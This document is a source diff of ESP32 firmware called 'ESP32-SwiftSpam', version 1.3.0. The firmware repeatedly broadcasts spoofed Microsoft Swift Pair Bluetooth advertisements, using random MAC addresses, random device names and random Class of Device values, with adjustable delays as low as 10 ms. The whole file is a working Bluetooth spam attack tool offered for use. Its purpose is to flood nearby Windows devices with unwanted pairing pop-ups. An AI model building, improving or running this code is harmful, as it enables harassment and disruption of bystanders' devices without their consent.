@@ -1,36 +1,84 @@
 // ESP32-SwiftSpam
 // Author: Kyhze
-// Version: 1.2.0
-// Date: 25/01/2025
+// Version: 1.3.0
+// Date: 26/01/2025
 
 #include <NimBLEDevice.h>
 #include <freertos/FreeRTOS.h>
 #include <freertos/task.h>
 #include <freertos/queue.h>
+#include <iostream>
+#include <map>
+#include <string>
+#include <cstdlib>
+#include <ctime>
+#include <vector>
+#include "bluetooth_cod.h" // Bluetooth Class of Device mappings
 
-const char* ver = "1.2.0";
+const char* ver = "1.3.0";
 bool SDEBUG = false; // Set to true to enable serial debug info
-// Ajdustable device name length
-uint8_t DEVICE_NAME_LENGTH = 8; // Set to 0 to disable names entirely. Maximum length: 23
+// Adjustable device name length
+uint8_t DEVICE_NAME_LENGTH = 8; // Set to 0 to disable names entirely. Maximum length: 19
 // Spam delay parameters
-const unsigned short MIN_DELAY = 10;    // Minimum delay in milliseconds
-const unsigned short MAX_DELAY = 1000;  // Maximum delay in milliseconds
-unsigned short currentDelay = 130;      // Default delay in milliseconds
+const uint16_t MIN_DELAY = 10;    // Minimum delay in milliseconds
+const uint16_t MAX_DELAY = 1000;  // Maximum delay in milliseconds
+uint16_t currentDelay = 90;       // Default delay in milliseconds
 
 // Shared variables for inter-task communication
 QueueHandle_t payloadQueue; // Queue to pass payload data between tasks
 struct PayloadData {
-    char* deviceName; // Dynamically allocated device name buffer
+    char* deviceName;    // Dynamically allocated device name buffer
     uint8_t mac[6];      // Random MAC address
     uint8_t advData[31]; // Advertisement data
     uint8_t advDataLen;  // Length of advertisement data
     bool hasName;        // Flag to indicate if a name is included
 };
 
+// Function to construct a Class of Device (CoD)
+uint32_t constructClassOfDevice(int majorServiceClass, int majorDeviceClass, int minorDeviceClass) {
+    return (majorServiceClass & 0xFFE000) | ((majorDeviceClass & 0x1F) << 8) | ((minorDeviceClass & 0x3F) << 2);
+}
+
+// Function to randomly select a CoD
+void selectRandomClassOfDevice(int& serviceClass, int& majorClass, int& minorClass) {
+    // Randomly select a Major Service Class
+    std::vector<int> serviceKeys;
+    for (const auto& entry : BluetoothCoD::MajorServiceClasses) {
+        serviceKeys.push_back(entry.first);
+    }
+    serviceClass = serviceKeys[random(serviceKeys.size())];
+
+    // Randomly select a Major Device Class
+    std::vector<int> majorKeys;
+    for (const auto& entry : BluetoothCoD::MajorDeviceClasses) {
+        majorKeys.push_back(entry.first);
+    }
+
+    // Ensure the selected Major Device Class has at least one Minor Device Class
+    do {
+        majorClass = majorKeys[random(majorKeys.size())];
+    } while (!BluetoothCoD::MinorDeviceClasses.count(majorClass));
+
+    // Randomly select a Minor Device Class for the selected Major Device Class
+    const auto& minorMap = BluetoothCoD::MinorDeviceClasses.at(majorClass);
+    std::vector<int> minorKeys;
+    for (const auto& entry : minorMap) {
+        minorKeys.push_back(entry.first);
+    }
+    minorClass = minorKeys[random(minorKeys.size())];
+
+    // Debugging output
+    if (SDEBUG) {
+        Serial.printf("[DEBUG] Selected Class of Device: Service=%s, Major=%s, Minor=%s\n",
+                      BluetoothCoD::MajorServiceClasses.at(serviceClass).c_str(),
+                      BluetoothCoD::MajorDeviceClasses.at(majorClass).c_str(),
+                      BluetoothCoD::MinorDeviceClasses.at(majorClass).at(minorClass).c_str());
+    }
+}
+
 // Function to generate a random device name
 void generateRandomDeviceName(char* name, int nameLength) {
     const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-/()=[]{}@!?.;,:/*$%+\\#<>";
-
     for (int i = 0; i < nameLength; i++) {
         name[i] = charset[random(sizeof(charset) - 1)];
     }
@@ -48,31 +96,58 @@ void generateRandomMac(uint8_t* mac) {
 
 // Function to generate SwiftPair advertisement data
 void generateSwiftPairAdvertisementData(const char* deviceName, uint8_t* advData, uint8_t* advDataLen, bool hasName) {
-    if (hasName) {
-        uint8_t nameLen = strlen(deviceName);
-        *advDataLen = 7 + nameLen; // BLE payload length (7 bytes for header + name length)
+    uint8_t nameLen = hasName ? strlen(deviceName) : 0;
 
-        int i = 0;
-        advData[i++] = *advDataLen - 1; // Length of this block
-        advData[i++] = 0xFF;           // Manufacturer Specific Data type
-        advData[i++] = 0x06;           // Microsoft Vendor ID (LSB)
-        advData[i++] = 0x00;           // Microsoft Vendor ID (MSB)
-        advData[i++] = 0x03;           // Beacon ID (3 = Microsoft-specific ID)
-        advData[i++] = 0x00;           // Flags (0x00) - Microsoft Beacon Sub Scenario
-        advData[i++] = 0x80;           // Flags (0x80) - Reserved RSSI Byte
-        memcpy(&advData[i], deviceName, nameLen); // Include the device name
-    } else {
-        // No name, only include the header
-        *advDataLen = 7; // BLE payload length (7 bytes for header)
+    // Maximum payload size is 31 bytes
+    const uint8_t maxPayloadSize = 31;
+    uint8_t remainingBytes = maxPayloadSize;
 
-        int i = 0;
-        advData[i++] = *advDataLen - 1; // Length of this block
-        advData[i++] = 0xFF;           // Manufacturer Specific Data type
-        advData[i++] = 0x06;           // Microsoft Vendor ID (LSB)
-        advData[i++] = 0x00;           // Microsoft Vendor ID (MSB)
-        advData[i++] = 0x03;           // Beacon ID (3 = Microsoft-specific ID)
-        advData[i++] = 0x00;           // Flags (0x00) - Microsoft Beacon Sub Scenario
-        advData[i++] = 0x80;           // Flags (0x80) - Reserved RSSI Byte
+    int i = 0;
+
+    // Randomly select a CoD
+    int serviceClass, majorClass, minorClass;
+    selectRandomClassOfDevice(serviceClass, majorClass, minorClass);
+    uint32_t cod = constructClassOfDevice(serviceClass, majorClass, minorClass);
+
+    // Add Manufacturer Specific Data - Including CoD
+    if (remainingBytes >= 10) {
+        advData[i++] = 9;             // Length of Manufacturer Specific Data
+        advData[i++] = 0xFF;          // Manufacturer Specific Data type
+        advData[i++] = 0x06;          // Microsoft Vendor ID (LSB)
+        advData[i++] = 0x00;          // Microsoft Vendor ID (MSB)
+        advData[i++] = 0x03;          // Microsoft Beacon Sub Scenario (Swift Pair)
+        advData[i++] = 0x02;          // Flags (Swift Pair scenario)
+        advData[i++] = 0x80;          // Reserved RSSI Byte
+        advData[i++] = cod & 0xFF;    // CoD LSB
+        advData[i++] = (cod >> 8) & 0xFF; // CoD Middle Byte
+        advData[i++] = (cod >> 16) & 0xFF; // CoD MSB
+
+        remainingBytes -= 10; // Reduce available bytes
+        if (SDEBUG) {
+            Serial.printf("[DEBUG] Class of Device in Payload: 0x%06X\n", cod);
+        }
+    }
+
+    // Add Complete Local Name (Display Name)
+    if (hasName && remainingBytes >= (2 + nameLen)) {
+        advData[i++] = 1 + nameLen;  // Length of the field (1 byte for type + name length)
+        advData[i++] = 0x09;        // Complete Local Name type
+        memcpy(&advData[i], deviceName, nameLen);
+        i += nameLen;
+        remainingBytes -= (2 + nameLen); // Reduce available bytes
+    }
+
+    // Set final advertisement data length
+    *advDataLen = i;
+
+    // Debugging output
+    if (SDEBUG) {
+        Serial.printf("[DEBUG] Advertisement Data Length: %d bytes\n", *advDataLen);
+        Serial.print("[DEBUG] Advertisement Data: ");
+        for (int j = 0; j < *advDataLen; j++) {
+            Serial.printf("%02X ", advData[j]);
+        }
+        Serial.println();
     }
 }
 
@@ -83,7 +158,7 @@ void generateDataTask(void* parameter) {
         uint8_t mac[6];
         generateRandomMac(mac);
 
-        // Generate SwiftPair advertisement data
+        // Prepare SwiftPair advertisement data
         uint8_t advData[31];
         uint8_t advDataLen;
         bool hasName = (DEVICE_NAME_LENGTH > 0);
@@ -93,6 +168,7 @@ void generateDataTask(void* parameter) {
             generateRandomDeviceName(deviceName, DEVICE_NAME_LENGTH);
         }
 
+        // Generate SwiftPair advertisement data
         generateSwiftPairAdvertisementData(deviceName, advData, &advDataLen, hasName);
 
         // Create a payload struct
@@ -144,11 +220,11 @@ void bleTask(void* parameter) {
             // Print debug info
             if (SDEBUG) {
                 if (payload.hasName) {
-                    Serial.printf("\n[+] Advertising Swift Pair device: %s\n", payload.deviceName);
+                    Serial.printf("\n[DEBUG] Advertising Swift Pair device: %s\n", payload.deviceName);
                 } else {
-                    Serial.println("\n[+] Advertising Swift Pair device: null");
+                    Serial.println("\n[DEBUG] Advertising Swift Pair device: DEVICE_NAME_DISABLED");
                 }
-                Serial.printf("[+] Using random source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
+                Serial.printf("[DEBUG] Using random source MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                               payload.mac[0], payload.mac[1], payload.mac[2],
                               payload.mac[3], payload.mac[4], payload.mac[5]);
             }
@@ -176,7 +252,7 @@ void setup() {
     Serial.printf("\nESP32-SwiftSpam ver.: %s\n", ver);
     Serial.println("\n[>>] Starting ESP32-SwiftSpam...");
     Serial.println("Use 'set delay <10-1000>' to change the delay (ms)");
-    Serial.println("Use 'set name len <0-23>' to change the device name length");
+    Serial.println("Use 'set name len <0-19>' to change the device name length");
     Serial.printf("\n[+] Spam delay set to: %lums\n", currentDelay);
     Serial.printf("[+] Device name length set to: %d\n", DEVICE_NAME_LENGTH);
 
@@ -205,7 +281,7 @@ void loop() {
         if (input.startsWith("set delay ")) {
             // Extract the delay value from the command
             String delayValueStr = input.substring(10); // "set delay " is 10 characters long
-            unsigned long newDelay = delayValueStr.toInt(); // Convert to integer
+            uint16_t newDelay = delayValueStr.toInt(); // Convert to integer
 
             // Validate the new delay value
             if (newDelay >= MIN_DELAY && newDelay <= MAX_DELAY) {
@@ -219,23 +295,23 @@ void loop() {
         else if (input.startsWith("set name len ")) {
             // Extract the name length value from the command
             String nameLenStr = input.substring(13); // "set name len " is 13 characters long
-            int newNameLen = nameLenStr.toInt(); // Convert to integer
+            uint8_t newNameLen = nameLenStr.toInt(); // Convert to integer
 
             // Validate the new name length value
-            if (newNameLen >= 0 && newNameLen <= 23) {
+            if (newNameLen >= 0 && newNameLen <= 19) { // Enforce strict length requirements
                 DEVICE_NAME_LENGTH = newNameLen; // Update the device name length
                 Serial.printf("\n[+] New device name length set to: %d\n", DEVICE_NAME_LENGTH);
                 if (DEVICE_NAME_LENGTH == 0) {
                     Serial.println("\n[+] Device name disabled");
                 }
             } else {
-                Serial.println("\n[-] Invalid name length. Please enter a value between 0 and 23");
+                Serial.println("\n[-] Invalid name length. Please enter a value between 0 and 19");
             }
         } else {
-            Serial.println("\n[-] Invalid command. Use 'set delay <10-1000>' or 'set name len <0-23>'");
+            Serial.println("\n[-] Invalid command. Use 'set delay <10-1000>' or 'set name len <0-19>'");
         }
     }
 
     // FreeRTOS scheduler will handle the tasks
-    vTaskDelay(pdMS_TO_TICKS(50)); // Small delay to avoid hogging the CPU
+    vTaskDelay(pdMS_TO_TICKS(30)); // Small delay to avoid hogging the CPU
 }
